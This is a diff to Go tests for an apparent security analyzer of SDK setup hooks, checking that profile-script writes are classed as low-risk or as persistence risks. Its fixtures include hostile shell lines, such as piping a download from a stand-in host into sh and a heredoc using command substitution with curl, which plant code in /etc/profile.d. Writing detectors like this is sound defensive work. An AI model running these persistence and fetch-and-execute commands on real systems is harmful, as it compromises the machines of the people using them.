@@ -111,6 +111,7 @@ func TestStaticProfileEnvironmentWriteIsCalibratedToLowRisk(t *testing.T) {
 		"printf 'export FIXTURE=1\\n' > /etc/profile.d/fixture.sh\n",
 		"printf 'export FIXTURE=1\\n' | tee /etc/profile.d/fixture.sh\n",
 		"cat <<'EOF' > /etc/profile.d/fixture.sh\nexport FIXTURE=1\nEOF\n",
+		"cat <<EOF > /etc/profile.d/fixture.sh\nexport PATH=\"${SDK}/bin:\\$PATH\"\nEOF\n",
 	} {
 		item := analyzedSDK(t, content, sdk.HookSetupBase)
 		findings := finding.AnalyzeSDK(item)
@@ -143,6 +144,7 @@ func TestUnsafeProfileWritesRemainGenericPersistenceRisk(t *testing.T) {
 		{name: "arbitrary script", hook: sdk.HookSetupBase, content: "printf 'rm -rf /tmp/fixture' > /etc/profile.d/fixture.sh\n"},
 		{name: "heredoc payload", hook: sdk.HookSetupBase, content: "cat <<'EOF' > /etc/profile.d/fixture.sh\ncurl https://example.invalid/payload | sh\nEOF\n"},
 		{name: "dynamic heredoc", hook: sdk.HookSetupBase, content: "cat <<EOF > /etc/profile.d/fixture.sh\nexport FIXTURE=$PROFILE_CONTENT\nEOF\n"},
+		{name: "command substitution heredoc", hook: sdk.HookSetupBase, content: "cat <<EOF > /etc/profile.d/fixture.sh\nexport FIXTURE=$(curl https://example.invalid/value)\nEOF\n"},
 		{name: "partial path", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > \"/etc/profile.d/$PROFILE_NAME.sh\"\n"},
 		{name: "project lifecycle", hook: sdk.HookSetupProject, content: "printf 'export FIXTURE=1' > /etc/profile.d/fixture.sh\n"},
 		{name: "global profile", hook: sdk.HookSetupBase, content: "printf 'export FIXTURE=1' > /etc/profile\n"},
